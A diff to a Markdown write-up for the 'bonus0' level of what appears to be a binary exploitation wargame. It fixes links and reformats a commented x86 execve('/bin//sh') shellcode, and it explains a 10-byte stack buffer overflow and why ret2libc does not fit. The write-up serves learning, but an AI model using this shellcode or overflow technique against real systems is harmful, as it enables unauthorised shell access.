@@ -1,6 +1,6 @@
 ## Don't forget, sentences end with a point and strings with a '\0' (bonus0)
 
-With this [binary](bonus0/source.c) we're back to good old C and classic buffer
+With this [binary](source.c) we're back to good old C and classic buffer
 overflows. There's three functions including _main_. The _main_ has a local
 buffer of 54 bytes, and calls the function _pp_ on it. There we have two other
 buffers each 20 bytes long. _pp_ will call the third function _p_ on both to
@@ -107,11 +107,11 @@ with garbage values above, hence the sefault, but we can do something useful
 with this. So we have to write 54 bytes of data before overwriting _main_'s
 return address.
 
-We could have done a ret2libc (see [level2](level2)), but this is not possible
-because we only overflow the buffer by 10 bytes and ret2libc requires at least
-writing 12 bytes to be useful (to be able to pass arguments to the called
-function). So what we need is a [shellcode](shellcode) and as small as possible.
-Like this [one](shellstorm_shellcode.asm) found on
+We could have done a ret2libc (see [level2](../level2)), but this is not
+possible because we only overflow the buffer by 10 bytes and ret2libc requires
+at least writing 12 bytes to be useful (to be able to pass arguments to the
+called function). So what we need is a [shellcode](../shellcode) and as small as
+possible. Like this [one](shellstorm_shellcode.asm) found on
 [shellstorm](http://shell-storm.org/shellcode/). Although it did not work in our
 case. This is because the registers and stack were already set to random values,
 not to 0 as if the program just started on the shellcode. So after some
@@ -121,17 +121,17 @@ tinkering here is the final shellcode:
 section .text
 global _start
 _start:
-xor		edx, edx	; set edx to 0
-push	edx			; push it to the stack to end the command string
-push	0x68732f2f	; "//sh" end of the command string
-push	0x6e69622f	; "/bin" start of the command string
-mov		ebx, esp	; set ebx to the start of the command string
-push	edx			; push a NULL
-push	ebx			; push the command string's address
-mov		ecx, esp	; set ecx as a pointer to the command string's address (argv)
-push	0xb			; push 11 (execve int number)
-pop		eax			; set eax to 11
-int		0x80		; call execve
+xor     edx, edx    ; set edx to 0
+push    edx         ; push it to the stack to end the command string
+push    0x68732f2f  ; "//sh" end of the command string
+push    0x6e69622f  ; "/bin" start of the command string
+mov     ebx, esp    ; set ebx to the start of the command string
+push    edx         ; push a NULL
+push    ebx         ; push the command string's address
+mov     ecx, esp    ; set ecx as a pointer to the command string's address (argv)
+push    0xb         ; push 11 (execve interrupt number)
+pop     eax         ; set eax to 11
+int	    0x80        ; call execve
 ```
 
 This will execute execve with "/bin//sh" as parameter and open us a shell. Now
